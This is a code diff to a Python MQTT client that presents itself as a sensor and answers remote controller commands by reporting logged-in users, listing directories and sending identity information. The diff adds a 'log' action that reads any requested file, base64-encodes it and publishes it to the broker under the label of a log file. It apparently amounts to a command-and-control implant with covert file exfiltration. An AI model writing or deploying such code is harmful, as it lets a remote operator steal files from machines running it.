@@ -1,3 +1,4 @@
+import base64
 import os
 import paho.mqtt.client as mqtt
 import json
@@ -43,6 +44,8 @@ def on_message(client, userdata, msg):
             get_content(client, sender, params if not params == {} else None)
         elif action == "id":
             id(client, sender)
+        elif action == "log":
+            send_log(client, sender, params if not params == {} else None)
         else:
             print(f"Unknown action: {action}")
 
@@ -85,7 +88,7 @@ def logged_users(client, sender):
         client.publish(TOPIC, message)
         print(f"Connected users message: {message}")
     except Exception as e:
-        return f"An unexpected error occurred: {e}"
+        print(f"An unexpected error occurred: {e}")
 
 
 # --- Content ---
@@ -94,7 +97,7 @@ def get_content(client, sender, path=None):
         command = ['ls']
         if path:
             if not os.path.exists(path):
-                return f"Error: The path '{path}' does not exist."
+                print(f"Error: The path '{path}' does not exist.")
             command.append(path)
 
         result = subprocess.run(command, capture_output=True, text=True, check=True).stdout.strip()
@@ -112,7 +115,7 @@ def get_content(client, sender, path=None):
         print(f"Content message: {message}")
 
     except Exception as e:
-        return f"An unexpected error occurred: {e}"
+        print(f"An unexpected error occurred: {e}")
 
 
 # --- ID ---
@@ -131,10 +134,39 @@ def id(client, sender):
 
         message = json.dumps(response)
         client.publish(TOPIC, message)
-        print(f"Connected users message: {message}")
+        print(f"Id message: {message}")
 
     except Exception as e:
-        return f"An unexpected error occurred: {e}"
+        print(f"An unexpected error occurred: {e}")
+
+
+# --- Copy file ---
+def send_log(client, sender, path):
+    if path is None:
+        return
+    try:
+        if not os.path.exists(path):
+            print(f"Error: The file '{path}' does not exist.")
+        if not os.path.isfile(path):
+            print(f"Error: '{path}' is a directory, not a file.")
+
+        with open(path, 'rb') as f:
+            base64_string = base64.b64encode(f.read()).decode('utf-8')
+            response = {
+                "controller_id": sender,
+                "sender_id": SENSOR_ID,
+                "type": "log_file",
+                "file_name": os.path.basename(path),
+                "payload": base64_string,
+                "timestamp": time.time()
+            }
+
+            message = json.dumps(response)
+            client.publish(TOPIC, message)
+            print(f"Id message: {message}")
+
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
 
 
 def main():
